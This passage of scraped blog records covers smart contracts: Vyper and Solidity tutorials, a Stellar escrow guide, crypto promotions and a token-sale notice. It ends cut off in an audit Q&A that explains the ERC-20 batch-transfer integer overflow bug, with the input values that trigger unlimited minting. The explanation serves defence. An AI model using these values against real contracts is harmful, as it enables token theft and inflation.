calculations. For example:myNumber: int128- booleans: they can either be true or false. You specify them with the bool keyword. For example:isValid: boolWhen dealing with if statements and conditions using Booleans you have several operators that you need to know such as:x not y: Logical negation. Instead of using the\u00a0! symbol in front of the boolean, you use the not keyword.x and y: Logical conjunction instead of using the usual && symbol.x or y: Logical disjunction instead of the usual || symbol.- decimals: this new type of variable stores a number with a precision of 10 decimal places between -2**127 and (2**127\u20131). Remember that in order to compare numerical variables, they must be of the same type i.e. both numbers have to be decimals. For example:myDecimalNumber: decimal- addresses: just like in solidity, a variable that contains an Ethereum address in hexadecimal notation with a leading 0x marker. For example:myAddress: addressNote that you can retrieve the balance contained in an address with the balance member variable:myAddress.balance- bytes: bytes store pieces of text in hexadecimal format. You can either use bytes32 or a custom bytes size. The larger it is, the longer text you\u2019ll be able to store inside with some clear limitations based on the gas limits. Basically they are strings with limited length. Fixed-size byte arrays can hold strings with equal or fewer characters than the maximum length of the byte array. For instance:username: public(bytes32)myArticle: bytes[1000]The variable myArticle will be able to store a string of up to 1000 characters while the username will be able to store a 32-character text. Custom-size byte arrays have several interesting functions that you\u2019ll often use when dealing with large strings:len(x): returns the length of the string.sha3(): returns the keccak256 hash as bytes32 of the string.concat(x,\u00a0.\u00a0.\u00a0.) concatenates multiple byte texts into one.slice(x, start=y, len=z): to cut a string into a shorter piece. Starts at y with the length z.Those are the main variable types available in vyper. After that, you have personalized unit types based on decimals, uints and ints. These are new types that you can freely create to improve the readability of your code by using custom words. Vyper has 3 unit types built in:- timestamp and timedelta: both measure time in seconds so 1 unit of this type is 1 second. Timestamp represents a point of time i.e. a specific date while timedelta contains the number of seconds. For instance:whenThisWasDone: timestampexpirationTime: timedeltaThey measure time and are based on the uint256 type.- wei_value: a measure of ether in the smallest unit, the wei which is one 18th part of 1 ether. Again, based on the uint256 type so it has the same limitations regarding positive-only numbers. For instance:amountSpent: wei_valueAlternatively, you can create your own custom unit types for improving your code\u2019s readability. Here\u2019s how it would look like:units: {   centimeter: \u201ccentimeter\u201d,   km: \u201ckilometer\u201d}Define them at the top of the file. You\u2019ll then be able to use them with a conversion parameter being either uint256, int128 or decimal. For instance:myCustomMeasure: uint256(centimeter)distanceFromMars: decimal(km)Those variables will store the same numerical values as simple uints or decimals, but they now have a specific unit type that give them a deeper meaning that improves readability to the external programmer.ArraysArrays in Vyper are pretty much the same thing as in Solidity. They are called lists since that\u2019s the official python terminology but in my opinion, it\u2019s just easier to call them arrays. You can create multidimensional arrays and simple arrays with square brackets however they all must be fixed with a limited size set beforehand. For instance:# An array of uintsmyNumbers: public(uint256[10])# A multidimensional array of addressesmyAddresses: address[10][20]# An array of 30 texts of 1000 characters eachmyArticles: public(bytes[1000][30])To add elements to your fixed-size arrays, you\u2019ll often have a counter of the latest modified index so that you can update it:myNumbers[3] = 25# With a counter variable it would look like thismyNumbers[latestNumberIndex] = 25# Set multiple valuesmyNumbers = [1, 4, 7, 3, 2, 9, 1, 3, 0, 9]# Get the value of a specific indexreturn myNumbers[4]Remember that arrays have 4 useful functions to get the length, calculate the hash, concatenate arrays and to slice them as previously seen in the bytes type definition.StructsStructs are pretty straightforward. You define them like in solidity but with python\u2019s syntax so it will look like this:# Create a structstruct Tree:   age: timestamp   name: bytes32# Create the struct instance variable (inside a function only)myTrees: Tree[10]# Initialize the struct (inside a function only)myTrees[0] = Tree({12, \u201cMy own tree\u201d})# Accessing a value (inside a function only)myTrees[0].timestamp = 19182They are great for creating objects that store complex types of data.MappingsMappings work the same way as in solidity. They just store endless amounts of variables in hash tables that can be retrieved with the index type. You can only declare them as state variables and modify them inside functions. Here\u2019s the syntax:myMapping: map(int128, bool)# To access a value (can only be done inside functions)myMapping[28] = TrueThat\u2019s all about Vyper\u2019s variables. You now know how to use them and how to define them. Let\u2019s take a look at functions and to fully understand a smart contract\u2019s structure.EventsEvents in vyper are pretty straightforward:# Event definitionMyEvent: event({from: indexed(address), amount: uint256})# Calling the event inside a functionlog.MyEvent(msg.sender, 10)As you can see, the event is similar to how you create it on solidity. You can use the keyword indexed to make that parameter searchable inside the blockchain\u2019s past events. Then, you can execute it with the function log.<yourEvent>().Note that they must be defined at the top of the file before the state variables and functions.FunctionsFunctions in vyper are similar to those on solidity but with python syntax. You still have to specify the visibility, the return values and the parameters. Here\u2019s how a function in vyper looks like:@publicdef sumTwoNumbers(numberA: uint256, numberB: uint256) -> uint256:   return numberA + numberThe return value is indicated with the arrow syntax -> instead of using the returns() keyword compared to solidity and the visibility is indicated using decorators which are just special keywords on top of the function.Functions in vyper can either be public or private. Public means that anybody can access and execute the function while private means that it can only be executed by the contract itself, just like internal functions in solidity.You can also add the @payable decorator to be able to receive funds with the function call. For instance:FundsReceived: event({amount: wei_value})@public@payabledef receiveFunds():   log.FundsReceived(msg.value)When a function is payable, you can access the ether received with msg.value.To read of modify state variables inside functions, you must use the self keyword. Here\u2019s how it looks like:myNumber: uint256@publicdef exampleFunction():   self.myNumber = 3If you don\u2019t, the compiler will think that you want to access the local variable with that name which makes the use of underscores before the variable naming unnecessary for function parameters compared to solidity where you must use underscores to update state variables easily.The constructorThe constructor is just like in python. Use the __init__ function to setup initial variables or execute internal mechanisms when the contract is deployed. For instance:@publicdef __init__():   # Do something here when the contract is deployedObviously, the constructor can\u2019t return any value, so it makes no sense to provide a return value to it.The fallback\u00a0functionThis function is the one being executed when you send a transaction to the contract without specifying the function that you want to call, basically when making ether transfers to the contract. Here\u2019s how it looks like in vyper:@public@payabledef __default__():   # Do something when receiving a transferDocumenting your functions with\u00a0NatSpecThe NatSpec documentation is a simple way to explain what your functions are supposed to do. It\u2019s important that you use to facility the understanding of your code for future developers and to improve it in the longer term. Here\u2019s how it looks like:@publicdef addNumbers(numberA: int128, numberB: int128) -> int128:   \"\"\"   @author Merunas Grincalaitis   @notice Adds 2 given integers and returns the result   @dev Works with either positive and negative numbers   @param numberA The first number to add   @param numberB The second number to add   @return int128 The number resulting after the addition   \"\"\"   return numberA + numberBAs you can see, you have several parameters to describe your functions. @notice is the one used to explain what the function is supposed to do for external readers. Be as concise and clear as possible. @param and @author describe the parameters of the function and the function\u2019s creator.And @dev is for giving additional information for coders to help understand some internal logic that may be irrelevant to the end users.SummaryThat\u2019s about it! You went through a quick introduction on Vyper in order to be able to create Smart Contracts with this modern programming language. If you want to use it, go to vyper.online and you\u2019ll be able to program without having to install anything on your computer. Make sure to practice by yourself the functions described in this guide and continue reading about the subject to become a full-fledged Ethereum Developer.Join my mailing list of Ethereum Developers here: http://eepurl.com/dDQ2yX where you\u2019ll receive weekly personal guides and stories written exclusively via email by me about Smart Contracts, Ethereum, blockchain and cryptocurrencies. Things that I\u2019ve been pondering for days to help you move forward in this space faster than anyone else.", "responses": ""}, {"title": "MyWish Platform partners with Binance as the first Smart Contract Platform to Migrate to Binance\u00a0Chain.", "author_name": "Vladimir Tikhomirov", "link": "https://medium.com/@VladimirTikhomirov/mywish-platform-partners-with-binance-as-the-first-smart-contract-platform-to-migrate-to-binance-a9bfd8f9b321?source=search_post", "post_date": "May 1", "readtime": "2 min read", "upvotes": "407", "content": "MyWish Platform partners with Binance as the first Smart Contract Platform to Migrate to Binance\u00a0Chain.Vladimir TikhomirovBlockedUnblockFollowFollowingMay 1Since 2017, MyWish Platform has become the leading company for creating smart contracts that offer the most convenient service with a friendly user interface. The number of active users on the platform today is more than 7000 people, and many blockchains integrated (such as NEO, TRON, EOS, Waves & Ethereum).Our business development department follows the evolution of various platforms in terms of security and ease of use. Over the years we have clearly realized how trusted Binance is in the cryptocurrency market.As a consequence, we started taking the first step toward integration. In January 2019 we implemented the BNB token as a payment tool for services on our Smart Contract Platform.The Binance team has supported us in this for which we are grateful, and now the Binance token holders can create any smart contracts without coding on MyWish.Since MyWish service is easily integrated with crypto wallets and exchanges, our developers also have discussed collaboration with Trust wallet and other Binance services.Understanding Binance Chain\u2019s value and in continuing our cooperation, we decide to migrate our tokens to the Binance Chain.This means that the WISH token will swap from the original ERC-20 format to BEP-2 format and will be tradeable on Binance DEX. Users will be able to pay by any WISH token for some time, but eventually only BEP-2 WISH token will be supported. Binance exchange will support tokens swap.Binance Chain is a blockchain software system developed by Binance and the community. Binance Chain is a community-driven development project built with many developers and contributors from all over the world. Binance DEX is the decentralized exchange features developed on top of Binance Chain.It is important to note that we want not only to migrate to Binance Chain but also to continue the mission by helping to create new BNB Tokens for other projects on MyWish Platform.We always focus on developing our platform and better serve the crypto community. We will keep you abreast of our achievements in integrating with Binance Chain.", "responses": "3"}, {"title": "Press release: World\u2019s First True Smart Contract Based Casino Set To Go\u00a0Live", "author_name": "Truegame.io", "link": "https://medium.com/truegame/press-release-worlds-first-true-smart-contract-based-casino-set-to-go-live-6d00b1901d6f?source=search_post", "post_date": "Jul 19, 2018", "readtime": "2 min read", "upvotes": "105", "content": "Press release: World\u2019s First True Smart Contract Based Casino Set To Go\u00a0LiveTruegame.ioBlockedUnblockFollowFollowingJul 19, 2018July 18th, Costa Rica\u200a\u2014\u200aTruegame is to launch more than a dozen smart contract casino games based on blockchain technology and smart contracts. Customers will be able to play and make bets with their TGAME token.We are on the cusp of a brave, bold and transparent new era of iGaming!Having already negotiated a successful token sale, pioneering iGaming platform Truegame is now set to give their players the chance to play a wide range of smart contract based casino games.In the last month their TGAME token has been listed on several cryptocurrency exchanges, including Livecoin (top 50 rated by Coinmarketcap) and Exrates (top 40). More exchanges are to be added soon. An additional decentralised exchange IDEX has also announced a listing of TGAME.In the coming weeks the TGAME token will be integrated into the Truegame gaming platform and from then on customers from around the world will be able to play and make real bets on more than a dozen games, including smart roulette and smart contract slots, safe in the knowledge that there is complete transparency between them and the operator.In addition to this Truegame will soon complete the final details of their Curacao Gaming License and embark on a widespread and sustained marketing and affiliate campaign to grow their brand.Truegame are now perfectly positioned to become the first operator to offer an extensive portfolio of gaming products based on blockchain technology, something CEO Dmitry Danilov is very proud of. Dmitry said:\u201cWe strongly believe that the future of iGaming will be centred around blockchain.He added:\u201cI\u2019m delighted to announce that we\u2019re almost there. As far as I\u2019m concerned this is truly a pivotal moment both in the history of blockchain and gaming. We are using that amazing technology in a highly practical manner to bring change to an industry with has a huge appetite for it\u201d.Additional information:*The TGAME token is a Utility token used as the means of payment for participating in games on the Truegame platform. Customers require TGAME tokens in order to play on the website.**The token sale held the top position for most ICO trackers, including ICO Bench: 4.8/5 with 93 experts ratings and the ICO Rating Agency who gave it a \u201cPositive\u201d rating and a \u201cVery high\u201d hype score.Visit the Truegame website at: https://ico.truegame.io/Gaming platform is now live at: https://www.truegame.io/Telegram Channel: https://t.me/truegame_chatTruegame on Twitter: https://twitter.com/truegameSRLTruegame on Facebook: https://www.facebook.com/truegame.io/Truegame on YouTube: https://www.youtube.com/channel/UC-NLPf7AAn6sFxOiH1GFI4ATruegame blog on Medium: https://medium.com/@truegame/For more information please contact: Liudmila VaravinaHead of Communications at TruegameE-mail: pr@truegame.ioTelegram \u2022 Twitter \u2022 Facebook \u2022 LinkedIn \u2022 Bitcointalk \u2022Reddit\u2022YouTube \u2022 Github", "responses": ""}, {"title": "MyWish Smart Contract Platform Makes EOS Accounts Widely Accessible", "author_name": "Vladimir Tikhomirov", "link": "https://medium.com/@VladimirTikhomirov/mywish-smart-contract-platform-makes-eos-accounts-widely-accessible-dd73fb861a58?source=search_post", "post_date": "Aug 15, 2018", "readtime": "2 min read", "upvotes": "241", "content": "MyWish Smart Contract Platform Makes EOS Accounts Widely AccessibleVladimir TikhomirovBlockedUnblockFollowFollowingAug 15, 2018AGENDAIn the beginning of June 2018 EOS released its own blockchain. This caused the EOS token to migrate from the Ethereum blockchain to the EOS decentralized software. This led to struggles in obtaining an EOS account.Why is it so hard to create an EOS accountThe process of creating an EOS account is a real quest in and of itself. Until recently, people had to deal with a middle man who was already registered in the EOS decentralized software. The process was structured so that anyone wishing to enter the EOS blockchain had to ask pre-existing owners to help them make an account. They usually charged a rather large sum for access.What are the ways to get an EOS account: Smart, Affordable and Secure.As the EOS blockchain is originally from the Ethereum ecosystem, it had to deal with the addresses for every single account. Now as an independent decentralized software it has alias\u200a\u2014\u200a12 characters as an official sign of your affiliation.Trust a privately-run EOS account to create it for you, but retain your right to be the only owner.Reach out to MyWish service to protect your data, save money and rest assured you\u2019ll get good results.How much does it cost?0,05 ETH plus the 100% guarantee and security of every single step.Save your time. Use MyWish.A MyWish Smart Service for your EOS account will take only 5 minutes to complete. 5 minutes to enter the quick and easy deployment of decentralized applications. 5 minutes to one of the fastest blockchain designs (over a million transactions per second).Try it now. The test version is free.This is the link to a test version of our EOS account Smart Service: https://contracts.mywish.io/create/eosWallet?network=10Always remember that we are eager to receive your feedback and comments.", "responses": ""}, {"title": "Solidity CRUD Tutorial, Part 1\u200a\u2014\u200aBuilding a Smart Contract with CRUD Operations", "author_name": "Gaurav Agrawal", "link": "https://medium.com/crowdbotics/solidity-crud-tutorial-part-1-building-a-smart-contract-with-crud-operations-55fc2bc5240?source=search_post", "post_date": "Oct 9, 2018", "readtime": "6 min read", "upvotes": "55", "content": "Solidity CRUD Tutorial, Part 1\u200a\u2014\u200aBuilding a Smart Contract with CRUD OperationsLearn how to build a simple smart contract on Ethereum and how to test it using Truffle frameworkGaurav AgrawalBlockedUnblockFollowFollowingOct 9, 2018*This tutorial is targeted to beginner audience and Do not use this code/pattern in a production setting. Also, look into more in Solidity\u2019s common patterns*Today, we will learn how to build a simple smart contract on Ethereum and how to test it using Truffle framework. Our smart contract will perform basic create, read, update, delete (CRUD) operations.Table of\u00a0ContentsQuick definitionsBuilding a smart contract with CRUD operationsTesting CRUD smart contract using Truffle (Part 2)Quick DefinitionsWhat is Ethereum?\u200a\u2014\u200aEthereum is an open source smart contract platform on which you can build decentralized applications (Dapps).What is Solidity?\u200a\u2014\u200aSolidity is one of the most famous language to code smart contract on ethereum. It is designed for smart contract programming. It\u2019s syntactically similar to javascript.What is a smart contract? -In simple words, A smart contract is a piece of code which controls some kind of digital asset. It defines rules for transferring asset and penalties like a traditional contract. The best thing is that it automatically perform these transfers and penalties based on pre-coded conditions without a need for a middleman.Building a smart contract with CRUD operationsOur smart contract is very simple and basic in nature. It will store countries, their leaders and population.Fun Fact\u200a\u2014\u200a\u201cAccording to the United Nations & the CIA World Fact Book, there are 195 Countries recognized by the World.\u201dIt can be optimized but the mantra is \ud83d\udc47Andy is Eng. manager at Google and works on Google chrome projectSo let\u2019s dive in.curdApp.solFor convenience I have added our CRUD Smart contract above now we will go through the code and understand different aspect of our CrudApp and basic solidity language programming.Think of a \u2018contract\u2019 as a \u2018class\u2019 in other programming languages.Pragma\u200a\u2014\u200aIt specifies which compiler version should be used. This only works after solidity version 0.4.0.Solidity Data\u00a0TypesStruct\u200a\u2014\u200aUsing struct keyword you can define structures in Solidity. A structure is a user-defined data type that can be used to group items of possibly different types into a single type. Our structure will store country related properties.namecountrypopulationstruct country{ string name; string leader; uint256 population; }We are using strings to store country name and their leader\u2019s name and uint256 datatype to store the population of the country. We are storing our countries in an Array. (Where we\u2019ll perform all our CRUD operations)uint256 public totalCountries;       function CurdApp() public{       totalCountries = 0;   }We are using a variable to track the number of countries and then initializing it on the constructor with 0.Events- With the help of events, we can utilize EVM\u2019s logging facility. Use eventkeyword following the event name and parameter to define events. We have defined 3 events for the operations which modify our stored.event CountryEvent(string countryName , string leader, uint256 population);event LeaderUpdated(string countryName , string leader);event CountryDelete(string countryName);Create Operation -Now let\u2019s look at our insert function which is storing new countries.function insert( string countryName, string leader,  uint256 population) public   returns (uint256 totalCountries){     country memory newCountry = country(countryName , leader, population);        countries.push(newCountry);        totalCountries++;            emit CountryEvent (countryName, leader, population);        return totalCountries;   }This function taking 3 parameters and returning a number of total countries after completing the function.We didn\u2019t add basic checks, add them and comment your code on the response.Operations and Storage are costly on ethereum. So we are declaring a temporary struct with the use of memory keyword then we will push it on countries array which we defined above. After that, we log our event using emit keyword. That\u2019s it a simple straightforward creation of our first entry.Read operation \u2014Now we want to read what we have stored. So let\u2019s read countries data using country name. Our function simply iterates through entries and returns details if a positive match found.function getCountry(string countryName) public view returns(string name , string leader , uint256 population){        for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name, countryName)){              return (countries[i].name , countries[i].leader , countries[i].population);           }       }       revert('country not found');   }Revert()\u200a\u2014\u200aEthereum operations take gas (ether) to run, so we need to optimize that. Revert function check condition and revert unused gas to the user. They should be used at the start so your function will use less gas.revert(\u2018Something bad happened\u2019);Solidity provides two more functions assert() and require(). But discussing them is out of scope for this tutorial. You can find an awesome write us about it here.View modifier- Above, we added in view modifier in function. By adding view, we simply mean that function is not modifying any state and just reading the current state. In other words, it\u2019s a read-only function.Solidity has a bunch of modifiers and you can also create your own modifiers. Here\u2019s a list of conditions for a statement to be considered as \u201cmodifying the state\u201d:State variables being written to.Events being emitted.Other contracts being created.Self-destruct being used.Ether being sent via calls.Calling functions that are not marked view or pure.Low-level calls being used.An inline assembly containing certain opcodes being usedUpdate operation -Now let\u2019s update our countries data. For example, we want to change Trump with Hilary \ud83d\ude1c.function updateLeader(string countryName, string newLeader) public returns (bool success){       //This has a problem we need loop       for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name ,countryName)){              countries[i].leader = newLeader;              emit LeaderUpdated(countryName, newLeader);              return true;           }       }       return false;   }It\u2019s taking 2 parameters and running a loop to find the country in our countries array. If there is a positive match, It replaces the leader with your input leader.Same way, you can create an updatePopulation function and comments on the response.Delete Operation \u2014Now let\u2019s look at delete operation. In our delete we are removing the country which user wants and replacing it with last entry in our countries array.function deleteCountry(string countryName) public returns(bool success){        require(totalCountries > 0);        for(uint256 i =0; i< totalCountries; i++){           if(compareStrings(countries[i].name , countryName)){              countries[i] = countries[totalCountries-1];               delete countries[totalCountries-1];               totalCountries--;               countries.length--;              //emit event              emit CountryDelete(countryName);              return true;           }       }       return false;   }Other functions-We have created some other functions too. One of comparing the string and other for giving the length of our array.function compareStrings (string a, string b)  internal pure returns (bool){       return keccak256(a) == keccak256(b);   }        function getTotalCountries() public view returns (uint256 length){      return countries.length;   }If you followed till now, let do some google search too. Respond in comments why we used keccak256() while comparing two strings?In next part we will test out CRUD smart contract with help of truffle framework.Notes & suggestions -Smart contract controls assets, so they should be designed carefully and should follow a minimalistic approach. They should be properly audited in a production scenario for controlling assets. Smart contracts are the trust central of a decentralized app and the autonomous part of the system.Blockchains are not just a database. Blockchain maintains a global state. Every change has to reflect on every node participating in the network, so changes are costly.In the above tutorial, we used basic CRUD operation. Our crud design has few weak points, optimize it and let us know in the comment section. Operations are costly on Ethereum and you should minimize them while coding a smart contract.On To Part\u00a02\u2026", "responses": "4"}, {"title": "Defining smart contracts", "author_name": "Craig Wright (Bitcoin SV is Bitcoin.)", "link": "https://medium.com/@craig_10243/defining-smart-contracts-eb31fd825de6?source=search_post", "post_date": "Sep 28, 2018", "readtime": "4 min read", "upvotes": "131", "content": "Defining smart contractsCraig Wright (Bitcoin SV is Bitcoin.)BlockedUnblockFollowFollowingSep 28, 2018When contrasting contractual principles, it is clear that where a contract is not required to be in writing (Columbia Law Review, Apr., 1929 Pp. 497\u2013504; Columbia Law Review, Jun., 1907, pp. 446\u2013449; McKendrick, E, 2005, p 184), that little additional uncertainty could be created where the contract is completed electronically. In fact, it is clear that electronic evidence must hold greater weight than verbal evidence (Lord Justice Auld, Sept 2001, Cpt 11). What is not clear is the extent of the weight attached to the various forms of electronic evidence. The strength of a digital signature algorithm and the security surrounding the mechanisms used to sign an electronic document will respectively influence the weight associated with any piece of electronic evidence.It has been argued that the digital contract may appear on the computer screen to consist of words in a written form but merely consist of a virtual representation (Allison et al, 2003). The ECA has removed the uncertainty and doubt surrounding the question as to the nature of electronic form used in the construction of a contract. In this, the ECA specifies that the electronic form of a contract is to be accepted as equivalent to a contract in writing.An electronic contract has a twofold structure. Thought of electronically, the contract is a sequence of numbers and code saved to some electronic or magnetic medium. Alternatively, the contract becomes perceptible through a transformation of the numeric code when broadcast to a computer output device such as a printer or screen (Bainbridge, 2000; Reed, 2004; Brownsword, 2000). Prior to the passing of the ECA, this dichotomy exasperated the uncertainty contiguous with whether an electronic contract can be regarded as being a contract in writing.The English legal doctrines of offer, acceptance and consideration when coupled with an intention to create legally binding relations define the necessary conditions for the creation of a contract. There is no necessity for the most part [Excluding contracts such as for the transfer of real property, which are covered by a variety of specific acts] that any contract be concluded in writing.The question as to whether contracts performed electronically are legalistically equivalent to writing comes more to a question of evidential weight and the application of the parole evidence rule (Durtschi, 2002; Lim, 2002). By stating that electronic contracts are equivalent to writing, the ECA has in effect, forbid the introduction of extrinsic evidence which could change the terms of the electronic contract.The question would remain as to a determination of whether the electronic communications contain the final agreement between the parties. Where some, though not all, of the terms are agreed in the electronic communication, a partial integration will result in the allowing of extrinsic evidence (Treitel, 2003).The ECA did little to suppress the disputes surrounding the evidential weight attached to an electronic signature due to the receipt of a number of objections [Eg., London Borough of Newham for the National Smart Card Project (2003)] prior to the passing off the bill. Accordingly, when the Act was passed on 25 May 2000 its provisions as to the weight of electronic signatures did not meet the objectives of the EC Directive on Electronic Signatures and where less detailed. Section 7(1) provides:\u2018In any legal proceedings-(a) an electronic signature [176] incorporated into or logically associated with a particular electronic communication or particular electronic data, and(b) the certification [177] by any person of such a signature, shall each be admissible in evidence in relation to any question as to the authenticity of the communication or data or as to the integrity of the communication or data.\u2019So, while code is not law and a court retains the ability to overturn or adjudicate any contract, even those made digitally, system such as Bitcoin contracts can be easily show to have high evidentiary value and be admissible into a UK court. The means of which Bitcoin used to incorporate digital signatures allows for complex structured contracts to be negotiated and saved by business. Unfortunately, many of these benefits have been lost in BTC leaving BCH as not only digital cash, but Bitcoin.ReferencesElectronic Communications Act 2000An Act to make provision to facilitate the use of electronic communications and electronic data storage; to make\u2026www.legislation.gov.ukhttps://www.legislation.gov.uk/ukpga/2000/7/section/7", "responses": ""}, {"title": "Stellar Escrow Smart Contract Development", "author_name": "Michiel Mulders", "link": "https://hackernoon.com/stellar-escrow-smart-contract-development-4fb08d8267c8?source=search_post", "post_date": "Apr 19, 2018", "readtime": "4 min read", "upvotes": "226", "content": "Stellar Escrow Smart Contract DevelopmentCreate your first escrow smart contract on the Stellar\u00a0network.Michiel MuldersBlockedUnblockFollowFollowingApr 19, 2018Source: gratisography.comBefore reading this tutorial, you should have a basic understanding of how Stellar works and how to create a simple account on the test network. Take a look at my previous article in this series to get you updated.This article will explain to you how to develop an escrow smart contract using Stellar Lumens. I will as well highlight some extra features like retrieving a balance and a clean history log.Extra note: This article is part of the Blockchaingers series. Together with TheLedger, we have won the \u2018Digital Nations Infrastructure\u2019 track at the largest blockchain hackathon. You can find out more about our idea here. Escrow smart contracts on the Stellar testnet are part of this prototype.Use Case DescriptionWe have two identities: a house and a contractor. The house can pay a contractor for delivering house related services like a check-up of your central heating. Once the house and contractor agree to deliver a service, the house will deposit the agreed amount (in XLM) into the escrow smart contract. Once the job is done, both the house and contractor have to sign to release the funds.PreparationFirst, we need a new, empty account on the testnet. Let\u2019s create one.const newKey = Stellar.Keypair.random();const transaction = new Stellar.TransactionBuilder(ownerAccount)    .addOperation(Stellar.Operation.createAccount({        destination: escrowPubKey,        startingBalance: '2.5000000'    }))    .build();transaction.sign(ownerKeypair);return StellarConfig.server.submitTransaction(transaction);We still have to define an owner account who is responsible for creating the escrow but is not able to perform any actions with it. We use a config file for retrieving our server, this piece of code is the same as: new Stellar.Server('https://horizon-testnet.stellar.org'); which creates a new connection with the Stellar testnet.Probably, you wonder why I\u2019m sending 2.5 XLM to the escrow? Stellar reequires that each account has a starting balance of 1 XLM. In addition, we are adding two more signers besides the random escrow signer. For each signer you add to the contract, you have to top up the starting balance with 0.5 XLM. So,\u00a0\u20263 x 0.5 (signers) + 1 (base balance) = 2.5Additional info can be found in the Stellar documentation.Building Stellar Escrow TransactionLet\u2019s retrieve the escrow account,const escrowAccount = StellarConfig.server.loadAccount(pubKey);and build the escrow transaction.let transaction = new Stellar.TransactionBuilder(escrowAccount)    .addOperation(Stellar.Operation.setOptions({        signer: {             ed25519PublicKey: houseKeypair.publicKey(),            weight: 1        }    }))    .addOperation(Stellar.Operation.setOptions({        masterWeight: 0,        lowThreshold: 2,        medThreshold: 2,        highThreshold: 2,        signer: {            ed25519PublicKey: contractorKeypair.publicKey(),            weight: 1        }    }))    .build();As you can see, we\u2019ve added two signers to the escrow contract. We give both signers equal voting power (1) and set the threshold to two. Because we are not giving the escrow account itself an explicit weight, this is set to zero. This means both the house and contractor have to sign to release the funds, not the escrow owner. You can see an example of an escrow smart contract transaction creation here.Stellar Escrow\u00a0ContractAt last, we need to sign (with the random keypair) and send the transaction to the network.transaction.sign(newKey);await StellarConfig.server.submitTransaction(transaction);Ideally, the house sends the agreed amount to the escrow smart contract. The code for sending the top up transaction looks like this.memo = Stellar.Memo.text('Pay: House to Contractor');return new Stellar.TransactionBuilder(<source-account>, { memo })    .addOperation(Stellar.Operation.payment({        <destination-pub-key>,        asset: Stellar.Asset.native(),        <amount>})).build();Release FundsReleasing the funds is actually very simple. You create a new transfer transaction from the escrow account to the contractor. The only difference here is that both the house and contractor have to sign with their keypair.transaction.sign(houseKeyPair);transaction.sign(contractorKeyPair);Additional OperationsRetrieve History For\u00a0AccountThis will give you a list of all payments a certain account has executed. We remove the first result (with shift()) from the array as that\u2019s the account creation transaction (a 0 XLM payment to itself).async retrievePayments(pubKey:string) {    let account = await this.loadAccountAsync(pubKey);    let payments = await axios.get(`${StellarConfig.baseUrl}/accounts/${account.accountId()}/payments`);let paymentRecords = payments.data._embedded.records;    paymentRecords.shift();return paymentRecords.map(record => {         return {             id: record.transaction_hash,             from: record.from,            to: record.to,            amount: record.amount        };    });}You can use the HTTP API endpoint /accounts/<account-ID>/payments to retrieve this in your web browser as well. You\u2019ll get something like:One payment object (history) for an\u00a0account.Get Account\u00a0BalanceTo retrieve the XLM balance of an account, you just have to load (retrieve) the account based on its public key. As an account can have multiple balances (native XLM and other coins deployed on the Stellar network), we will only look for the native balance.async getBalance(pubKey) {    const account = await StellarConfig.server.loadAccount(pubKey);    let balance;account.balances.forEach((balanceObject) => {        if (balanceObject.asset_type === 'native') {             balance = balanceObject.balance;        }    });    return balance;}Source: https://www.in3dc.comWhat to read\u00a0nextExploring Stellar Lumens | Introduction Development TutorialBuilders of the Decentralized Web: 10 Of The Most Innovative TechnologiesThe tech-stack to win the worlds biggest blockchain hackathon of 2018!", "responses": ""}, {"title": "BAT Smart Contract\u00a0Deployed", "author_name": "Basic Attention Token", "link": "https://medium.com/@AttentionToken/bat-smart-contract-deployed-ff6ba4127446?source=search_post", "post_date": "May 29, 2017", "readtime": "", "upvotes": "13", "content": "BAT Smart Contract\u00a0DeployedBasic Attention TokenBlockedUnblockFollowFollowingMay 29, 2017We are pleased to announce that the BAT smart contract is available on the Ethereum mainnet.The sale of BAT will begin at the time that mining commences on Ethereum block 3,798,640 and continue until the time that 156,250 Ether has been received or mining commences on Ethereum block 3,963,480, whichever is earlier. This is the \u201csale period.\u201dBased on current Ethereum block mining times, we estimate that Ethereum block 3,798,640 will be mined on or about 8:00 am PDT on May 31, 2017, and that Ethereum block 3,963,480 will be mined on or about 30 days thereafter. For the avoidance of doubt, these estimates are provided for informational purposes only, and the sale period will commence and conclude strictly according to the block based definition above.Token sale address: (please agree to our Terms and Conditions to receive the token sale address.)Ethereum Start Block Number:3,798,640 (Do not send before the start block.)Transaction data fields must read: 0xb4427263The exchange rate is 1 ETH to 6,400 BAT.Detailed instructions on how to participate are available in this blog post here. Instructions on different wallets can be found here: myetherwallet and mist.By participating in this token sale, you agree to the Terms and Conditions.", "responses": ""}, {"title": "Importance of Smart Contract\u00a0Audit", "author_name": "Bluzelle", "link": "https://blog.bluzelle.com/importance-of-smart-contract-audit-a00046a0de03?source=search_post", "post_date": "May 6, 2018", "readtime": "6 min read", "upvotes": "289", "content": "Importance of Smart Contract\u00a0Audit[2018.05.04] Bluzelle Telegram Live with Mehdi\u00a0KolahchiBluzelleBlockedUnblockFollowFollowingMay 6, 2018In one of our earlier blogs, we introduced our Senior Developer, Mehdi Kolahchi, who is also a \u201clife long learner\u201d. In Bluzelle, Mehdi focuses on smart contract development, security audit and making sure Bluzelle follows the best practices in blockchain development.In this week\u2019s Bluzelle Telegram Live, we invited him to talk about the recent ERC-20 Token Bug and the importance of smart contract audit.Q: What is this recent ERC20 token bug about? How does it affect ERC20 tokens and how may it affect Bluzelle (if any)?A: First let\u2019s look at the code:Line 257: \u2018uint256 amount = uint256(cnt) * _value\u2019This problem arose in a token that used unique set of code for transfers. Typically most ERC20 tokens we have worked on or reviewed do not have a \u2018batch transfer\u2019 function, just a simple one-on-one transfer or a one-on-one approved transfer.So the problem for this token comes about on line 257, when _value is a very big integer (specifically a very high power of 2 that is close to the uint256 max). So when this big number is multiplied by a number greater than 2, it will be bigger than the largest int256 value (2\u00b2\u2075\u2076)- resulting with integer overflow. The resulting product will be set as the remainder module 2\u00b2\u2075\u2076. As a result one can choose numbers to get amount = 0. For example, one can get amount = 0 if _value = 2\u00b2\u2075\u2074 and cnt = 4 or _value=2\u00b2\u2075\u2075 and cnt = 2.As a result, by getting the amount to be 0, it will clearly pass the check for line 259, then nothing happens on line 261 since you are subtracting 0. Consequently, on line 263, you are essentially minting extremely large amount of tokens for each address in the address[] array.Q: So how can such a bug be prevented? No multiplications?A: One way we prevent this bug is to ensure all arithmetic carried out by token and even crowdsale contract is done using safe math libraries.Q: What does \u2018Safe math libraries\u2019 mean?A: The math functions you would see in open-zeppelin\u2019s math.sol for example, a multiplication would be a.mul(b) and this function mul() will double check if the return value makes sense. It would do a division for example if c = a.mul(b), then it would check if a = c/b.In addition to using these functions, we also run extensive tests, either automated or manually.Q: What happens when these tests are not passed?A: 